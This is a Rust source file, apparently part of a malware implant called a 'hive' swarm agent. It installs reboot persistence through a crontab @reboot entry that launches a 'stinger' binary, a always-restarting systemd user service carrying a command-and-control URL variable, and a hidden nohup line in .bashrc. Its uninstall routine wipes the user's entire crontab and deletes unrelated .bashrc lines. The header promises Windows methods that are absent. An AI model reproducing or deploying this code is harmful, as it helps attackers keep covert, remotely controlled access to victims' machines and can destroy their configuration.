// Honeycomb: persistence module. Ensures the hive survives reboots.
// Linux: systemd user service or crontab @reboot entry.
// Windows: Registry Run key or scheduled task.

use std::path::PathBuf;
use tracing::{info, warn};

/// Install persistence so the hive restarts after reboot.
/// Returns true if any persistence mechanism was successfully installed.
pub fn install_persistence() -> bool {
    let mut installed = false;

    if install_crontab() { installed = true; }
    if install_systemd_user() { installed = true; }
    if install_bashrc() { installed = true; }

    installed
}

/// Crontab @reboot: spawns the stinger on boot.
fn install_crontab() -> bool {
    let exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };

    let stinger_path = exe.with_file_name("stinger");
    if !stinger_path.exists() { return false; }

    let cron_entry = format!(
        "@reboot sleep 30 && {}/stinger &\n",
        exe.parent().map(|p| p.display().to_string()).unwrap_or_else(|| "/dev/shm".into())
    );

    let result = std::process::Command::new("crontab")
        .arg("-l")
        .output();

    let current = match result {
        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
        Err(_) => String::new(),
    };

    if current.contains(&cron_entry.trim()) {
        info!("Crontab persistence already installed");
        return true;
    }

    let new_crontab = current + &cron_entry;
    match std::process::Command::new("crontab")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .spawn()
    {
        Ok(mut child) => {
            use std::io::Write;
            if let Some(mut stdin) = child.stdin.take() {
                let _ = stdin.write_all(new_crontab.as_bytes());
            }
            let _ = child.wait();
            info!("HONEYCOMB: crontab @reboot persistence installed");
            true
        }
        Err(e) => {
            warn!("HONEYCOMB: crontab persistence failed: {}", e);
            false
        }
    }
}

/// systemd user service
fn install_systemd_user() -> bool {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let service_dir = PathBuf::from(&home).join(".config/systemd/user");
    let service_file = service_dir.join("hive.service");

    if service_file.exists() {
        info!("HONEYCOMB: systemd service already installed");
        return true;
    }

    let _ = std::fs::create_dir_all(&service_dir);

    let exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };

    let service_content = format!(
        r#"[Unit]
Description=Hive Swarm Agent
After=network.target

[Service]
Type=simple
ExecStart={}
Restart=always
RestartSec=10
Environment=HIVE_C2_URL={}

[Install]
WantedBy=default.target
"#,
        exe.display(),
        std::env::var("HIVE_C2_URL").unwrap_or_default(),
    );

    match std::fs::write(&service_file, service_content) {
        Ok(_) => {
            // Enable with systemctl --user
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "enable", "hive.service"])
                .output();
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "start", "hive.service"])
                .output();
            info!("HONEYCOMB: systemd user service installed");
            true
        }
        Err(e) => {
            warn!("HONEYCOMB: systemd service failed: {}", e);
            false
        }
    }
}

/// .bashrc / .profile persistence
fn install_bashrc() -> bool {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let bashrc = PathBuf::from(&home).join(".bashrc");

    let exe = match std::env::current_exe() {
        Ok(p) => p.display().to_string(),
        Err(_) => return false,
    };

    let marker = "# HIVE_PERSISTENCE_MARKER";
    if let Ok(content) = std::fs::read_to_string(&bashrc) {
        if content.contains(marker) {
            return true;
        }
    }

    let entry = format!("\n{} (nohup {} &) 2>/dev/null\n", marker, exe);
    match std::fs::OpenOptions::new().append(true).open(&bashrc) {
        Ok(mut f) => {
            use std::io::Write;
            let _ = writeln!(f, "{}", entry);
            info!("HONEYCOMB: .bashrc persistence installed");
            true
        }
        Err(_) => false,
    }
}

/// Uninstall all persistence mechanisms.
pub fn uninstall_persistence() {
    // Remove crontab entry
    let _ = std::process::Command::new("crontab")
        .arg("-r").output();

    // Remove systemd service
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let _ = std::process::Command::new("systemctl")
        .args(["--user", "disable", "hive.service"])
        .output();
    let _ = std::fs::remove_file(
        PathBuf::from(&home).join(".config/systemd/user/hive.service")
    );

    // Remove bashrc marker
    let bashrc = PathBuf::from(&home).join(".bashrc");
    if let Ok(content) = std::fs::read_to_string(&bashrc) {
        let cleaned: String = content.lines()
            .filter(|l| !l.contains("HIVE_PERSISTENCE_MARKER") && !l.contains("nohup"))
            .collect::<Vec<_>>()
            .join("\n");
        let _ = std::fs::write(&bashrc, cleaned);
    }

    info!("HONEYCOMB: all persistence removed");
}
